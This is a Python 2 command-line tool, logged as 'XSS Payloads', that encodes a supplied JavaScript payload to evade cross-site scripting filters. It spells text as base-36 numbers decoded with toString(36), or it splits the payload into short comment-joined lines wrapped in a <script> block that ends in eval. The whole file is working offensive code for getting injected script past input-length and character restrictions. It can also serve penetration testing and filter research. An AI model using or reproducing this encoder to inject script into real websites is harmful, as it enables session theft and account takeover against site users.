#!/usr/bin/env python2

import sys
import argparse
import string
import logging
import re

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

class ColorFormatter(logging.Formatter):
    COLORS = {
        'DEBUG'    : BLUE,
        'INFO'     : WHITE,
        'WARNING'  : YELLOW,
        'ERROR'    : RED,
        'CRITICAL' : RED,
    }
    def format(self, record):
        return '\x1b[1;3%dm%s\x1b[0m' % (
                self.COLORS[record.levelname],
                logging.Formatter.format(self,record))

MAX_JS_INT = 9007199254740991 # Number.MIN_SAFE_INTEGER

class Payload:
    def __init__(self, raw='', to_string='"toString"'):
        self.raw = raw
        self.to_string = to_string
    
    def __len__(self):
        return len(self.raw)
    
    def __str__(self):
        return self.raw
    
    def append(self, payload):
        self.raw += payload
    
    def prepend(self, payload):
        self.raw = payload + self.raw
    
    def as_split_to_len(self, quote='"', max_len=15, **kwargs):
        if max_len < 10:
            # need to fit at least */eval/*
            logger.error("This encoding requires at least 10 characters per line")
            return ''
        
        logger.warn("This encoding won't work if the content between any of the separate split payloads contains multiline comments (/* ... */")
        prefix = '*/'
        suffix = '/*'
        dummy_var = 'X'
        comment = suffix + '\n' + prefix
        sep = quote + '+' + comment + quote
        setup_suffix = 'eval(%s)</script>' % dummy_var
        setup_prefix = comment.join(split_to_len(
            '<script>%s=' % dummy_var, count=max_len-len(suffix)))
        left_at_last_line = max_len - len(setup_prefix.rsplit('\n',1)[-1])
        
        # padding to take into account any content on the line between
        # the prefix and the start of the payload
        padding = '?' * (max_len - left_at_last_line - len(prefix))
        
        # if there's no space for at least "<letter>"+/*, just start
        # on the next line
        if left_at_last_line < 6:
            setup_prefix = setup_prefix + comment
            padding = ''
        
        payload = self.raw.replace(quote,'\\'+quote)
        logger.debug('Splitting %s' % payload)
        # len(sep)+1 is to compensate for the newline
        lines = split_to_len(padding+payload, count=max_len-len(sep)+1)
        lines[0] = lines[0][len(padding):]
        
        # there is always space for the ; at the end, since it takes
        # the place of the + on previous lines
        encoded = '%s%s%s%s;' % (setup_prefix, quote,
                sep.join(lines), quote)
        lines = encoded.rsplit('\n',1)
        left_at_last_line = max_len - len(lines[-1])
        
        if left_at_last_line >= len(setup_suffix):
            encoded = encoded + setup_suffix
        else:
            # hold on to the last two characters of setup_prefix
            # since there will be no suffix at the end, so we can put
            # two extra characters on the last line
            # len(comment)+1 is to compensate for the newline
            to_add = split_to_len(lines[-1]+setup_suffix[:-2],
                count=max_len-len(comment)+1,
                no_split_on='(\\\\.|eval|\([%s]\)|</scrip)' % dummy_var)
            to_add[-1] = to_add[-1] + 't>'
            if max_len == 10:
                # no space for */ before </script>, there will be some
                # JavaScript errors due to random content between the
                # last two payload chunks
                encoded = '\n'.join(lines[:-1] + \
                        [comment.join(to_add[:-1]) + ';'] + to_add[-1:])
            else:
                encoded = '\n'.join(lines[:-1] + [comment.join(to_add)])
        
        return encoded
    
    def as_num_to_string(self, quote='"', max_int=MAX_JS_INT, **kwargs):
        left = self.raw
        encoded = ''
        warned = False
        while left:
            logger.debug('Next: "%s"' % left)
            num, left, unsupp = str_to_dec(left, max_int)
            if num >= 0:
                encoded += '%u[%s](36)+' % (num, self.to_string)
            if unsupp:
                encoded += '%s%s%s+' % (quote,
                    unsupp.replace(quote,'\\'+quote), quote)
                if not warned:
                    logger.warning('This encoding supports lowercase ' +
                        'letters and digits only. Rest of characters will ' +
                        'be added literally')
                    warned = True
        
        encoded = encoded[:-1] # strip trailing "+"
        return encoded

def split_to_len(payload, count=None, no_split_on='(\\\\.)'):
    '''
    payload is to be split at count number of characters but never
    within at atomic group defined by no_split_on
    no_split_on is a regex of groups of characters which should be kept
    together
      - it must have exactly one capturing group
      - it doesn't make sense for it to be able to match more than
        count characters
    returns an array of strings, no longer than count
    '''
    
    if count is None:
        count = len(payload)
    flatten = lambda z: [x for y in z for x in y]
    lines = re.split(no_split_on,payload)
    # even indexed elements of lines are the ones that match
    # no_split_on; leave them as they are; split the odd ones
    return list(get_next_split_chunk(lines, count))

def get_next_split_chunk(payloads, count):
    '''
    payloads is an array whose even indexed elements are atomic
    (cannot be split) and odd ones should be split at count number of
    characters
    yields a string, no longer than count
    '''
    curr = ''
    can_split = True # True when to_add is odd indexed
    for to_add in payloads:
        while True:
            if not to_add:
                break
            if len(curr) >= count:
                yield curr
                curr = ''
                continue
            if can_split or len(curr+to_add) <= count:
                curr, to_add = (curr+to_add)[:count],(curr+to_add)[count:]
            else:
                yield curr
                curr = to_add
                break
        can_split = not can_split
    if curr:
        yield curr

def split_to_len_simple(payload, count=None):
    if count is None:
        count=len(payload)
    return filter(None,re.findall('(.{,%u})' % count, payload))

def str_to_dec(payload, max_int):
    '''
    Returns a tuple: num, todo, removed
      num["toString"](36) gives a string from the beginning of payload
            until removed+todo; if there was an usupported character
            at the beginning num will be -1
      if we stopped becuase of unsupported characters, removed
      contains all such characters
      todo is the rest of the string after initial unsupported
            characters are removed
    '''
    
    supp_chars = string.lowercase+string.digits
    num = 0
    if payload[0] not in supp_chars:
        num = -1
    pos = 0
    err = False
    for c in payload:
        if c not in supp_chars:
            err = True
            break
        
        new_num = num*36 + (ord(c)-87 if c in string.lowercase else int(c))
        
        logger.debug('pos=%u, num=%u' % (pos,new_num))
        if new_num > max_int:
            logger.debug(
                'JS integer would overflow, ' +
                'string truncated to "%s"' % payload[0:pos])
            break
        
        pos = pos + 1
        num = new_num
    
    left = payload[pos:]
    todo = left.lstrip(left.translate(None, supp_chars))
    removed = left.replace(todo,'')
    
    return num, todo, removed


if __name__ == "__main__":
    logger = logging.getLogger('XSS Payloads')
    log_handler = logging.StreamHandler()
    log_handler.setFormatter(ColorFormatter('%(levelname)s: %(message)s'))
    logger.addHandler(log_handler)
    
    parser = argparse.ArgumentParser(
        argument_default=argparse.SUPPRESS,
        description='TO DO')
    parser.add_argument('payload', metavar='STRING',
        help='''Raw payload.''')
    parser.add_argument('-e', '--encoding', dest='encoding',
        default='num_to_string', metavar='NAME',
        choices=['num_to_string', 'split_to_len'],
        help='''Type of payload encoding. More types to come
        soon...''')
    parser.add_argument('--singleQ', dest='quote',
        default='"', action='store_const', const="'",
        help='''Use single quotes for concatenating.''')
    parser.add_argument('-d','--debug', dest='loglevel',
        default=logging.INFO, action='store_const',
        const=logging.DEBUG,
        help='''Be very verbose.''')
    parser.add_argument('--toString', dest='to_string',
        metavar='STRING',
        help='''String to use instead of "toString" when
        encoding payload as <num>["toString"](36).''')
    parser.add_argument('--maxLen', dest='max_len',
        metavar='NUMBER', type=int,
        help='''Maximum length to use when
        splitting payload.''')
    parser.add_argument('--maxInt', dest='max_int',
        metavar='NUMBER', type=int,
        help='''Maximum integer to use when
        encoding payload as <num>["toString"](36).''')
    args = parser.parse_args()
    
    logger.setLevel(args.loglevel)
    
    try:
        p = Payload(args.payload, to_string=args.to_string)
    except AttributeError:
        p = Payload(args.payload)
    
    print '%s' % getattr(p, 'as_'+args.encoding)(**vars(args))
